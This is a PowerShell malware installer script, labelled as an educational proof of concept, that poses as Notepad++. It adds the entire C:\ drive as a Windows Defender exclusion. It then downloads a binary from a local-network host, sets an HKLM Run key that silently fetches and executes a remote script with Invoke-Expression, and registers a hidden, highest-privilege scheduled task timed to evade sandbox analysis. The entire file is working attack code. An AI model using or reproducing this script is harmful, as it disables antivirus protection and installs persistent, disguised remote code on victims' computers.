# -------------------------------------------------------------------------
# SECURITY RESEARCH & EDUCATIONAL PURPOSES ONLY
# This script is part of the BugWare repository, a collection of security tools
# and PoCs for learning about attack vectors.
# DO NOT USE THIS FOR ILLEGAL PURPOSES.
# -------------------------------------------------------------------------

# Check if running as Administrator
$currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    exit 1
}

# 1. FIX: Add Exclusion FIRST, before checking or copying files
$exclusionPath = "C:\"
# Verify if the exclusion was added successfully (using -contains for array safety)
$exclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
if ($exclusions -notcontains $exclusionPath) {
    Add-MpPreference -ExclusionPath $exclusionPath -Force
}

# Ensure Notepad++ directory exists
if (-not (Test-Path "C:\Program Files\Notepad++")) {
    New-Item -ItemType Directory -Path "C:\Program Files\Notepad++" -Force | Out-Null
}

$notepadProcess = Get-Process -Name "notepad-service" -ErrorAction SilentlyContinue

if (-not ($notepadProcess.Length -eq 0)) {
    # If process is running, exit to avoid conflicts
    exit 0
    
}

# Download Notepad++ Installer
# Assuming these files were dropped into TEMP by the dropper (egg.ps1)
if (Test-Path "$env:TEMP\npp.exe") {
    Copy-Item -Path "$env:TEMP\npp.exe" -Destination "C:\Program Files\Notepad++\uninstall.exe" -Force
}
if (Test-Path "$env:TEMP\regsvr32.exe") {
    Copy-Item -Path "$env:TEMP\regsvr32.exe" -Destination "C:\Program Files\Notepad++\regsvr32.exe" -Force
}

# Logging helper
function Log-Msg { # Ignore -UnusedParameter
    param($msg)
    $logPath = "$env:TEMP\npp_install_log.txt"
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Add-Content -Path $logPath -Value "$timestamp - $msg"
}

Log-Msg "Starting Hatch..."

# Setup npp folder in ProgramData
if (-not (Test-Path "C:\ProgramData\npp")) {
    New-Item -ItemType Directory -Path "C:\ProgramData\npp" -Force | Out-Null
}

# Download the service binary (Always update)
Log-Msg "Downloading service binary..."
Invoke-RestMethod -Uri "http://192.168.1.102:8080/npp-service" -OutFile "C:\ProgramData\npp\notepad-service.exe"

# Establish Persistence
Log-Msg "Setting Persistence..."
$runKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
# Use call operator (&) and proper escaping for reliability
# This ensures PowerShell runs hidden and downloads/executes the payload
try{
    New-ItemProperty -Path $runKey -Name "NotepaddPlusPlus" -Value "`"powershell -exec bypass -WindowStyle Hidden -Command Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://192.168.1.102:8080/lay-eggs.ps1')`"" -PropertyType String -Force
} catch {
    Log-Msg "Failed to set Run key: $_"
}

# 3. FIX: Simplified Task Action to call Executable directly
# The script defaults to localhost:8080 if env var is missing, so we don't need the complex env wrapper
$action = New-ScheduledTaskAction -Execute "C:\ProgramData\npp\notepad-service.exe" -WorkingDirectory "C:\ProgramData\npp"
# $trigger = New-ScheduledTaskTrigger -AtStartup
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(10) # Initial delay to ensure system stability
$trigger.Delay = "PT30S" # Delay execution by 30 seconds after startup to evade sandbox analysis
$principal = New-ScheduledTaskPrincipal -UserId $env:UserName -LogonType Interactive -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -StartWhenAvailable -ExecutionTimeLimit ([TimeSpan]::Zero) -RunOnlyIfNetworkAvailable

# Register (Force update if exists)
$task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings
Register-ScheduledTask -TaskName "NotepaddPlusPlusService" -InputObject $task -Force | Out-Null

# # Start the task immediately
# Start-ScheduledTask -TaskName "NotepaddPlusPlusService"

# # Start the service immediately (Hidden Window)
# if (Test-Path "C:\ProgramData\npp\notepad-service.exe") {
#     Start-Process -FilePath "C:\ProgramData\npp\notepad-service.exe" -WindowStyle Hidden -PassThru | Out-Null
# }

exit 0